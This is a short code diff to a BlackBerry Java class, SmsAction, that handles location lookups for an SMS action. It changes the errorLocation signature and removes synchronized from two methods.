@@ -63,7 +63,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 case TYPE_LOCATION:
                     // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                     if (!getGPSPosition()) {
-                        errorLocation();
+                        errorLocation(false);
                     }
 
                     break;
@@ -148,9 +148,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     private boolean getGPSPosition() {
-
       
-
         if (waitingForPoint) {
             //#ifdef DEBUG
             debug.trace("waitingForPoint");
@@ -185,7 +183,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
             //#ifdef DEBUG
             debug.error("Cannot get QualifiedCoordinates");
             //#endif                        
-            errorLocation();
+            errorLocation(false);
         }
 
         final StringBuffer sb = new StringBuffer();
@@ -196,7 +194,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     }
 
-    public synchronized void errorLocation() {
+    public void errorLocation(boolean interrupted) {
         //#ifdef DEBUG
         debug.error("Cannot get Location");
         //#endif  
@@ -210,7 +208,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     private String descrType;
 
-    public synchronized void waitingForPoint(boolean b) {
+    public void waitingForPoint(boolean b) {
         waitingForPoint = b;
     }
 
